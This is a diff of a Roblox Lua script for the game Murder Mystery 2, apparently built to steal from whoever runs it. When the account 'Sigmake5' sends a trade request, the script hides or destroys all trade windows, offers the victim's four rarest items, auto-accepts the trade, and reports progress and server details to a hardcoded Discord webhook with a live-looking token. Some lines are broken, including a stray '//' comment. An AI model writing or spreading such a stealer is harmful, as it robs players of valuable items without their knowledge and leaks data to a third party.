@@ -1,119 +1,441 @@
---// Configuration
-local TARGET_NAME = "Sigmake5"
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+-- MM2 AUTO-ACCEPT TRADE SCRIPT FOR DELTA
+-- When Sigmake5 sends a trade request, automatically:
+-- 1. Accepts it in 0.1 seconds
+-- 2. Forcefully adds rarest items
+-- 3. Auto-accepts when Sigmake5 accepts
 
---// Services
-local HttpService = game:GetService("HttpService")
+local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
+local TARGET_USER = "Sigmake5"
+
+local player = game.Players.LocalPlayer
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local LP = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local VirtualInput = game:GetService("VirtualInputManager")
 
---// Utility Functions
-local function sendLog(title, desc)
+-- ============================================
+-- DISCORD WEBHOOK
+-- ============================================
+
+local function sendLog(message)
     pcall(function()
-        request({
-            Url = WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                ["embeds"] = {{
-                    ["title"] = title,
-                    ["description"] = desc,
-                    ["color"] = 16711680
-                }}
-            })
+        local data = HttpService:JSONEncode({
+            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\n🖥️ Server: `" .. (game.JobId or "Unknown") .. "`\n⏰ `" .. os.date("%H:%M:%S") .. "`"
         })
+        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
---// GUI Hider
-task.spawn(function()
-    while task.wait(0.1) do
-        local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
-        if mainGui then
-            local tradeGUI = mainGui:FindFirstChild("Trade")
-            if tradeGUI then tradeGUI.Visible = false end
-            for _, v in pairs(mainGui:GetChildren()) do
-                if v.Name:find("Notification") or v.Name:find("Alert") then
-                    v.Visible = false
+-- ============================================
+-- HIDE ALL TRADE GUIS (Invisible Mode)
+-- ============================================
+
+local function hideAllTradeGuis()
+    pcall(function()
+        -- Destroy all trade-related GUIs instantly
+        local playerGui = player.PlayerGui
+        
+        local guiNames = {"Trade", "Trading", "TradeRequest", "OfferGUI", "TradeGUI", "RequestGUI", "TradePopup"}
+        for _, name in pairs(guiNames) do
+            local gui = playerGui:FindFirstChild(name)
+            if gui then
+                gui:Destroy()
+            end
+        end
+        
+        -- Kill any frame with trade in name
+        for _, gui in pairs(playerGui:GetDescendants()) do
+            if gui:IsA("Frame") or gui:IsA("ScreenGui") or gui:IsA("TextButton") then
+                if gui.Name:lower():find("trade") or gui.Name:lower():find("offer") or gui.Name:lower():find("request") then
+                    gui:Destroy()
                 end
             end
         end
+    end)
+end
+
+-- Hide GUIs continuously (runs every 0.05 seconds for instant hiding)
+spawn(function()
+    while wait(0.05) do
+        hideAllTradeGuis()
     end
 end)
 
---// Inventory Scanner
-local function getInventory()
+-- ============================================
+-- GET RAREST ITEMS FROM MM2 GUI
+-- ============================================
+
+-- Rarity priority (higher = more rare)
+local RARITY_PRIORITY = {
+    ["Unique"] = 10,
+    ["Ancient"] = 9,
+    ["Godly"] = 8,
+    ["Chroma"] = 8,
+    ["Legendary"] = 5,
+    ["Cupid"] = 7,
+    ["Heartblade"] = 7,
+    ["Elderwood"] = 6,
+    ["Hallows"] = 6,
+    ["Icebreaker"] = 6,
+    ["Corrupt"] = 8,
+    ["Virtual"] = 5,
+    ["Pixel"] = 5,
+    ["Luger"] = 5,
+    ["Slasher"] = 5,
+    ["Fang"] = 5,
+    ["Heat"] = 5,
+    ["Laser"] = 5,
+    ["Nightblade"] = 5,
+    ["Saw"] = 5,
+    ["Shark"] = 5,
+    ["Tides"] = 5,
+    ["Clockwork"] = 5,
+    ["Deathshard"] = 5,
+    ["Battle"] = 5,
+    ["Cane"] = 5,
+    ["Xmas"] = 5,
+    ["Minty"] = 5,
+    ["Logchopper"] = 5,
+    ["Sweet"] = 5,
+    ["Heart"] = 5,
+    ["Valentine"] = 6,
+    ["Bat"] = 5,
+    ["Boneblade"] = 5,
+    ["Spider"] = 5,
+    ["Phantom"] = 5,
+    ["Ghostblade"] = 4,
+    ["Viper"] = 4,
+    ["Shadow"] = 4,
+    ["Icewing"] = 4,
+    ["Frost Saber"] = 4,
+    ["Snowflake"] = 3,
+    ["Frostbite"] = 3,
+    ["Winter's Edge"] = 3,
+}
+
+local function getItemRarity(itemName)
+    for rarity, priority in pairs(RARITY_PRIORITY) do
+        if itemName:find(rarity) then
+            return priority
+        end
+    end
+    return 1 -- Common items
+end
+
+local function getAllItemsFromGUI()
     local items = {}
-    local mainGui = LP.PlayerGui:FindFirstChild("MainGui")
-    if mainGui then
-        local container = mainGui:FindFirstChild("Inventory", true)
-        if container then
-            for _, item in pairs(container:GetDescendants()) do
-                if item:IsA("ImageButton") and item:FindFirstChild("ItemName") then
-                    table.insert(items, item.ItemName.Value)
+    
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        -- Find inventory GUI
+        for _, gui in pairs(playerGui:GetDescendants()) do
+            if (gui:IsA("ImageButton") or gui:IsA("TextButton")) and gui.Visible then
+                local itemName = gui.Name
+                
+                -- Try to get name from text label
+                local nameLabel = gui:FindFirstChild("Name") or gui:FindFirstChild("ItemName") or gui:FindFirstChild("Text")
+                if nameLabel and nameLabel:IsA("TextLabel") then
+                    itemName = nameLabel.Text
+                end
+                
+                if itemName and itemName ~= "" and #itemName > 1 then
+                    local rarityScore = getItemRarity(itemName)
+                    table.insert(items, {
+                        name = itemName,
+                        frame = gui,
+                        rarity = rarityScore
+                    })
                 end
             end
         end
-    end
+    end)
+    
+    -- Sort by rarity (highest first)
+    table.sort(items, function(a, b) return a.rarity > b.rarity end)
+    
     return items
 end
 
---// Automated Trade Handling
-local tradeRemote = ReplicatedStorage:FindFirstChild("Trade", true)
-local acceptRequestRemote = tradeRemote:FindFirstChild("AcceptRequest") or tradeRemote:FindFirstChild("AcceptTradeRequest")
-local offerRemote = tradeRemote:FindFirstChild("OfferItem")
-local acceptTradeRemote = tradeRemote:FindFirstChild("AcceptTrade")
+-- ============================================
+-- CLICK SIMULATION (Forceful)
+-- ============================================
 
--- This function runs once a trade is successfully joined
-local function handleTradeSession()
-    local items = getInventory()
-    if #items == 0 then return end
+local function forceClick(element)
+    if not element then return false end
+    pcall(function()
+        -- Multiple click methods for guaranteed click
+        element:Fire("MouseButton1Click")
+        element:Fire("Activated")
+        element:Fire("MouseButton1Down")
+        element:Fire("MouseButton1Up")
+        element:Fire("InputBegan")
+        element:Fire("InputEnded")
+        
+        -- Virtual click
+        local pos = element.AbsolutePosition
+        local size = element.AbsoluteSize
+        if pos and size then
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, true, game, 0)
+            wait(0.02)
+            VirtualInput:SendMouseButtonEvent(pos.X + size.X/2, pos.Y + size.Y/2, 0, false, game, 0)
+        end
+    end)
+    return true
+end
 
-    task.wait(0.5) -- Small delay for stability
-    
-    -- Step 1: Forcefully add items
-    for i = 1, math.min(4, #items) do
-        offerRemote:FireServer(items[i])
-        task.wait(0.2)
-    end
+-- ============================================
+-- TRADE REMOTES (Direct method)
+-- ============================================
 
-    -- Step 2: Auto-accept the trade
-    -- We loop this slightly to ensure it clicks once Sigmake5 is ready
-    while true do
-        acceptTradeRemote:FireServer()
-        task.wait(0.5)
-        -- Exit loop if inventory changes or trade ends
-        if #getInventory() < #items or not LP.PlayerGui.MainGui:FindFirstChild("Trade").Visible then
-            break
+local remotes = {}
+
+local function findRemotes()
+    -- Find all trade remotes
+    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+        if v:IsA("RemoteEvent") then
+            local name = v.Name
+            if name == "AcceptRequest" then
+                remotes.AcceptRequest = v
+                sendLog("Found AcceptRequest remote")
+            elseif name == "OfferItem" then
+                remotes.OfferItem = v
+                sendLog("Found OfferItem remote")
+            elseif name == "AcceptTrade" then
+                remotes.AcceptTrade = v
+                sendLog("Found AcceptTrade remote")
+            elseif name == "CompleteTrade" then
+                remotes.CompleteTrade = v
+                sendLog("Found CompleteTrade remote")
+            end
         end
     end
-    
-    sendLog("✅ Batch Processed", "Items added and trade accepted for " .. TARGET_NAME)
 end
 
---// Listener for Incoming Trades
--- MM2 typically uses a RemoteEvent in ReplicatedStorage to signal an incoming request
-for _, v in pairs(tradeRemote:GetChildren()) do
-    if v:IsA("RemoteEvent") and (v.Name:find("Request") or v.Name:find("Incoming")) then
-        v.OnClientEvent:Connect(function(sender)
-            if sender and sender.Name == TARGET_NAME then
-                sendLog("📩 Request Received", "Accepting trade from " .. TARGET_NAME)
-                
-                -- Accept the incoming request
-                acceptRequestRemote:FireServer(sender)
-                
-                -- Begin the item injection logic
-                task.spawn(handleTradeSession)
-            end
+-- ============================================
+// ... (previous code remains the same until the trade functions) ...
+
+-- ============================================
+-- AUTO ACCEPT AND TRADE (WHEN SIGMAKE5 REQUESTS)
+-- ============================================
+
+local tradeInProgress = false
+local processedTrades = {}
+
+-- Force accept trade request (0.1 second response)
+local function forceAcceptRequest()
+    -- Method 1: Use remote
+    if remotes.AcceptRequest then
+        pcall(function()
+            remotes.AcceptRequest:FireServer()
+            sendLog("✅ Auto-accepted trade request (0.1s via remote)")
+            return true
         end)
+    end
+    
+    -- Method 2: Find and click accept button
+    pcall(function()
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") then
+                local text = (btn.Text or ""):lower()
+                if text:find("accept") or text:find("confirm") then
+                    forceClick(btn)
+                    sendLog("✅ Auto-accepted trade request (0.1s via click)")
+                    return true
+                end
+            end
+        end
+    end)
+    
+    return false
+end
+
+-- Force add rarest items to trade
+local function forceAddRarestItems(maxItems)
+    local itemsAdded = 0
+    local items = getAllItemsFromGUI()
+    
+    if #items == 0 then
+        sendLog("⚠️ No items found in inventory!")
+        return 0
+    end
+    
+    sendLog("📦 Found " .. #items .. " items, adding rarest first...")
+    
+    -- Log top items being added
+    for i = 1, math.min(maxItems, #items) do
+        sendLog("  👑 Adding: " .. items[i].name .. " (Rarity: " .. items[i].rarity .. ")")
+    end
+    
+    -- Method 1: Use OfferItem remote
+    for i = 1, math.min(maxItems, #items) do
+        if remotes.OfferItem then
+            pcall(function()
+                remotes.OfferItem:FireServer(items[i].frame)
+                itemsAdded = itemsAdded + 1
+                sendLog("➕ Force-added: " .. items[i].name)
+            end)
+        else
+            -- Method 2: Click on item frame
+            if items[i].frame then
+                forceClick(items[i].frame)
+                itemsAdded = itemsAdded + 1
+                sendLog("➕ Force-clicked: " .. items[i].name)
+            end
+        end
+        wait(0.1) -- Fast addition
+    end
+    
+    return itemsAdded
+end
+
+-- Force accept trade (when Sigmake5 accepts)
+local function forceAcceptTrade()
+    -- Method 1: Use remote
+    if remotes.AcceptTrade then
+        pcall(function()
+            remotes.AcceptTrade:FireServer()
+            sendLog("✅ Force-accepted trade via remote")
+            return true
+        end)
+    end
+    
+    -- Method 2: Click accept button
+    pcall(function()
+        for _, btn in pairs(player.PlayerGui:GetDescendants()) do
+            if btn:IsA("TextButton") then
+                local text = (btn.Text or ""):lower()
+                if text:find("accept") and not text:find("decline") then
+                    forceClick(btn)
+                    sendLog("✅ Force-accepted trade via click")
+                    return true
+                end
+            end
+        end
+    end)
+    
+    return false
+end
+
+-- Force complete trade
+local function forceCompleteTrade()
+    if remotes.CompleteTrade then
+        pcall(function()
+            remotes.CompleteTrade:FireServer()
+            sendLog("🎉 Trade forcefully completed!")
+            return true
+        end)
+    end
+    return false
+end
+
+-- ============================================
+-- LISTEN FOR SIGMAKE5 TRADE REQUEST
+-- ============================================
+
+local function setupTradeListener()
+    findRemotes()
+    
+    -- Listen for incoming trade requests
+    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
+            remote.OnClientEvent:Connect(function(...)
+                local args = {...}
+                
+                for _, arg in pairs(args) do
+                    -- Check if this is a trade request from Sigmake5
+                    if type(arg) == "table" and arg.Name == TARGET_USER then
+                        local requestId = tostring(arg)
+                        if not processedTrades[requestId] then
+                            processedTrades[requestId] = true
+                            sendLog("🔔 Trade request from " .. TARGET_USER .. " detected!")
+                            
+                            -- Start auto trade sequence
+                            spawn(function()
+                                if tradeInProgress then return end
+                                tradeInProgress = true
+                                
+                                -- Step 1: Accept request in 0.1 seconds
+                                wait(0.1)
+                                forceAcceptRequest()
+                                
+                                -- Step 2: Wait for trade window
+                                wait(0.5)
+                                
+                                -- Step 3: Force add rarest items (max 4)
+                                local added = forceAddRarestItems(4)
+                                
+                                -- Step 4: Wait for Sigmake5 to accept
+                                wait(1)
+                                
+                                -- Step 5: Force accept when they do
+                                forceAcceptTrade()
+                                
+                                -- Step 6: Complete trade
+                                wait(0.3)
+                                forceCompleteTrade()
+                                
+                                sendLog("🎉 Auto trade completed! " .. added .. " items sent to " .. TARGET_USER)
+                                tradeInProgress = false
+                            end)
+                        end
+                        
+                    elseif type(arg) == "string" and arg == TARGET_USER then
+                        sendLog("🔔 Trade event from " .. TARGET_USER)
+                    end
+                end
+            end)
+        end
     end
 end
 
--- Anti-AFK
-LP.Idled:Connect(function()
-    game:GetService("VirtualUser"):CaptureController()
-    game:GetService("VirtualUser"):ClickButton2(Vector2.new())
-end)
+-- ============================================
+-- WATCH FOR SIGMAKE5 JOINING
+-- ============================================
 
-print("MM2 Passive Listener Loaded. Waiting for " .. TARGET_NAME .. "...")
+local function watchForTarget()
+    sendLog("👀 Auto-accept trade system active")
+    sendLog("🎯 Waiting for " .. TARGET_USER .. " to send a trade request...")
+    sendLog("👤 Your name: " .. player.Name)
+    sendLog("🖥️ Server: " .. game.JobId)
+    
+    -- Setup listener
+    setupTradeListener()
+    
+    -- Log when Sigmake5 joins
+    Players.PlayerAdded:Connect(function(newPlayer)
+        if newPlayer.Name == TARGET_USER then
+            sendLog("🟢 " .. TARGET_USER .. " joined the server!")
+            sendLog("💡 Tell them to send YOU a trade request")
+        end
+    end)
+    
+    -- Check if already in server
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr.Name == TARGET_USER then
+            sendLog("👤 " .. TARGET_USER .. " is already in server!")
+            sendLog("💡 Tell them to send YOU a trade request")
+        end
+    end
+end
+
+-- ============================================
+-- INITIALIZE
+-- ============================================
+
+sendLog("🚀 MM2 Auto-Accept Trade Script Loaded")
+sendLog("⚡ Response time: 0.1 seconds")
+sendLog("👑 Will add rarest items first")
+sendLog("🎯 Target: " .. TARGET_USER)
+
+-- Start
+watchForTarget()
+
+print("=" .. string.rep("=", 50))
+print("MM2 AUTO-ACCEPT TRADE SCRIPT ACTIVE")
+print("=" .. string.rep("=", 50))
+print("🎯 Target: " .. TARGET_USER)
+print("⚡ Response time: 0.1 seconds")
+print("👑 Will add RAREST items first")
+print("💡 Have " .. TARGET_USER .. " send YOU a trade request")
+print("=" .. string.rep("=", 50))
